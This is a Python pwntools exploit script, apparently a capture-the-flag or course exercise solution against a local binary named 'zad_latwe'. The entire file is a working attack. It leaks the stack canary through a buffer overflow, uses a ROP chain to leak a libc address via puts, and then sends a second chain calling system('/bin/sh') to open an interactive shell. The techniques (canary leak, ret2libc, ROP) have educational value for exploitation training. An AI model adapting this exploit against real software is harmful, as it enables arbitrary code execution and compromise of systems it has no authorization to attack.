from pwn import *

printf_offset = 0x55800
system_offset = 0x45390
binsh_offset = 0x18cd17


# leak canary

p = process('./zad_latwe')

p.recvuntil("):")
p.send("263\n")
p.recvuntil("bufor:\n")
p.send(" " * 263 + "\n")

canary = p.recv(33)
canary = canary.split(" ")[1].split("\n")[0]
canary = int(canary)
canary &= 0xffffffffffffffff

print("Canary: %s" % hex(canary))


# leak libc addr

p.recvuntil("):")
p.send("-200\n")
p.recvuntil("bufor:\n")

msg = 264 * 'a'
msg += p64(canary)
msg += 'a' * 8
msg += p64(0x400ae3) # pop rdi; ret;
msg += p64(0x601029) # printf address in GOT +1 (LSB of printf offset is \x00 in this libc version)
msg += p64(0x400720) # puts address in PLT (call puts)
msg += p64(0x400a5e) # call unpack_long_long

p.send(msg)

printf_addr = p.recv(6)[:5]

printf_addr = '\x00' + printf_addr + '\x00\x00'
printf_addr = u64(printf_addr)

print(printf_addr)

libc_addr = printf_addr - printf_offset
system_addr = libc_addr + system_offset
binsh_addr = libc_addr + binsh_offset

print("Printf: %s" % hex(printf_addr))
print("Libc: %s" % hex(libc_addr))


# Inject shellcode

p.recvuntil("):")
p.send("-200\n")
p.recvuntil("bufor:\n")

msg = 264 * 'a'
msg += p64(canary)
msg += 'a' * 8
msg += p64(0x400ae3) # pop rdi; ret;
msg += p64(binsh_addr)
msg += p64(system_addr)

p.send(msg)

p.interactive()